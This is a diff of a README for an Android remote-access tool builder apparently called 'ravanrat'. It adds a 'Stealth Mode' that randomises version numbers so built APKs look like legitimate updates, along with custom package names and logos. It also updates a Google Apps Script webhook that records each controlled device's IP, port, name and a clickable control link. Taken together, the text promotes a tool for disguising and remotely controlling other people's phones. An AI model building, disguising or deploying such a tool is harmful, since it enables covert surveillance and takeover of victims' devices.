@@ -17,7 +17,6 @@ Control devices using just a Google Sheet!
 - ✅ Works behind any firewall/NAT
 - ✅ Control from anywhere with just a Google Sheet
 
-
 **Star ⭐ this repo to stay updated!**
 
 ---
@@ -34,20 +33,28 @@ New features drop every week. Star ⭐ this repo to stay updated!
 
 ### Windows
 
-```
+```powershell
 cd builder
 .\build.ps1
 ```
 
 ### Linux / Mac
 
-```
+```bash
 cd builder
 chmod +x build.sh
 ./build.sh
 ```
 
-That's it! The builder handles everything - Java check, keystore, logo, and APK.
+**New Builder v2.0 Features:**
+
+- **Signed & Unsigned APKs**: Automatically generates both `signed.apk` (for release) and `unsigned.apk`.
+- **Advanced Identity**: Customize App Name, Package Name (ID), and Min SDK.
+- **Stealth Mode**: Randomly generates Version Name and Version Code to look like legitimate updates.
+- **Smart Logo**:
+  - Automatically resizes any image to all Android densities.
+  - Optional **Transparency Generation** (removes white backgrounds).
+  - Forces "Legacy Mode" to bypass adaptive icons on newer Androids.
 
 📖 **For detailed build guide, read [Builder README](builder/README.md)**
 
@@ -96,12 +103,12 @@ That's it! The builder handles everything - Java check, keystore, logo, and APK.
 ## 🛠️ Builder Features
 
 - ✅ Auto Java check/install
-- ✅ Keystore generation
-- ✅ Custom app name
-- ✅ Custom logo (uses ravanrat.png)
-- ✅ Version config
-- ✅ Google Sheet webhook
-- ✅ One-click build
+- ✅ Keystore generation (Auto & Manual)
+- ✅ Custom App Name & Package Name
+- ✅ **Random Version Generation** (Stealth)
+- ✅ **Advanced Logo Processing** (Resize & Transparent)
+- ✅ Google Sheet webhook with clickable links
+- ✅ One-click build (Signed + Unsigned)
 
 ---
 
@@ -111,19 +118,31 @@ Want device IPs in a spreadsheet?
 
 1. Create Google Sheet
 2. Extensions → Apps Script
-3. Paste this:
+3. Paste this **UPDATED** code:
 
 ```javascript
 function doPost(e) {
   var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
   var data = JSON.parse(e.postData.contents);
-  sheet.appendRow([new Date(), data.device, data.ip, data.port]);
-  return ContentService.createTextOutput("OK");
+
+  // Get current date/time
+  var timestamp = new Date();
+
+  // Add row with: Timestamp | IP | Port | Device Name | Clickable Link
+  sheet.appendRow([
+    timestamp,
+    data.ip,
+    data.port,
+    data.device,
+    data.link, // <--- NEW! Direct Clickable Link
+  ]);
+
+  return ContentService.createTextOutput("Success");
 }
 ```
 
 4. Deploy → Web App → Anyone
-5. Copy URL → Paste in builder
+5. Copy URL → Paste in builder when asked.
 
 ---
 
@@ -136,7 +155,7 @@ ravan/
 │   ├── build.sh          # Linux/Mac
 │   ├── build.bat         # Windows CMD
 │   ├── build.ps1         # Windows PowerShell
-│   └── output/           # Built APKs
+│   └── output/           # Built APKs (Signed & Unsigned)
 └── app/                  # Android source
 ```
 
